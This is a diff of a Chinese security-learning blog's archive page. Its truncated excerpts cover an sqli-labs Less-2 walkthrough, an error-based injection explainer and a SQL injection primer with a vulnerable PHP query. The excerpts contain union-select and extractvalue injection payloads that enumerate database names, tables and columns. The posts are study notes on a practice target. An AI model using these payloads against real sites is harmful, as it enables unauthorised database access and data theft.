+?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/" title="sql-labs靶场less2">sql-labs靶场less2</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-12T13:26:15.000Z" title="发表于 2023-05-12 21:26:15">2023-05-12</time></span></div><div class="content">练习回顾靶场less2
+tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，
+echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;
+
+
+1.判断注入类型
+
+可以知道是数值型
+2.判断字段数
+?id=1 order by 4 不正常
+?id=1 order by 3 正常
+
+
+
+可以确定有三列
+3.判断可以回显的字段数
+?id=-1 union select 1,2,3
+
+
+4.判断数据库名和版本
+?id=-1 union select 1,database(),version()
+
+
+5.获取表名
+?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
+
+
+6.获取列名
+?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns wher ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="报错注入">报错注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-09T12:56:50.000Z" title="发表于 2023-05-09 20:56:50">2023-05-09</time></span></div><div class="content">报错注入的定义当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。
+报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。
+常见的函数1.extractvalue()
+2.updataxml()
+3.count() + rand() +floor() +group  by() 导致的主键重复
+extractvalue()extractvalue (xml_document,xpath_string)
+第一个参数是xml文档对象名称
+第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。
+extractvalue(null,concat(0x7e,(sqli_inject),0x7e))
+
+注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。
+
+UpdateXml函数函数用法：
+UPDATEXML(XM ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/" title="sql注入">sql注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-07T02:17:36.000Z" title="发表于 2023-05-07 10:17:36">2023-05-07</time></span></div><div class="content">什么是sql注入？SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。
+php代码举例：
+$query = &quot;select * from users where id = $_GET[&#39;id&#39;];
+
+sql注入原理sql注入漏洞的产生需要满足以下两个条件：
+1.参数用户可控：前端传给后端的参数内容是用户可以控制的；
+2.参数传入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。
+当传入的id参数为 1’ 时，
+select * from users where id=1&#39;
+
+这不符合数据库语法的规范，所以会报错。
+当传入的id参数为and 1=1 时，
+select * from users where id= 1 and 1 = 1
+
+因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，
+当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id = ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-06T12:26:57.000Z" title="发表于 2023-05-06 20:26:57">2023-05-06</time></span></div><div class="content">python基础一、数学计算符1.+加 -减 *乘 /除 //整除 %余数 **幂指数
+2.变量：python的容器，跟print函数（打印数据类型及函数对象）
+异曲同工：变量可以存放数据类型及函数对象，简短的代码（结果也属于Python中的数据类型）
+使用变量来存放字符串及数值
+存放的过程在Python中叫’赋值’，赋值就是=符号，不是数学中的等于
+Python中的等于是”==”，赋值是”=”，一个’=’叫赋值，两个”==”叫等于
+eg：1.
+a=’小许’  b=3  c=3+4
+print(c)
+
+
+
+2==2
+true 布尔值就是由条件判断得到的
+变量，帮助我们减少代码的复杂性，增强可读性，不管用户输入什么都不会影响我们提前写好代码
+二、命名命名：采用驼峰命名法，字母开头(小写)，下换线结尾
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dokiy</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dokidokiy"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" title="linux基础命令">linux基础命令</a><time datetime="2023-07-15T07:08:38.000Z" title="发表于 2023-07-15 15:08:38">2023-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/12/ctfhub/" title="ctfhub">ctfhub</a><time datetime="2023-07-12T14:24:10.559Z" title="发表于 2023-07-12 22:24:10">2023-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" title="无题">无题</a><time datetime="2023-06-22T09:32:44.299Z" title="发表于 2023-06-22 17:32:44">2023-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="无题">无题</a><time datetime="2023-06-22T06:46:50.320Z" title="发表于 2023-06-22 14:46:50">2023-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a><time datetime="2023-05-22T15:51:37.000Z" title="发表于 2023-05-22 23:51:37">2023-05-22</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">15</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">19</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-07-17T07:26:54.841Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Dokiy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: (str) => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: (subtitleType) => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        getScript('https://cdn.jsdelivr.net/npm/typed.js/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
   }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">aurora</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">19</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2023</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">aurora</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+}
+</script><script>function subtitleType () {
+  getScript('https://yijuzhan.com/api/word.php?m=js').then(() => {
+    const con = str[0]
+    if (true) {
+      const from = '出自 ' + str[1]
+      const sub = []
+      sub.unshift(con, from)
+      typedJSFn.init(sub)
+    } else {
+      document.getElementById('subtitle').textContent = con
+    }
+  })
+}
+typedJSFn.run(subtitleType)
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
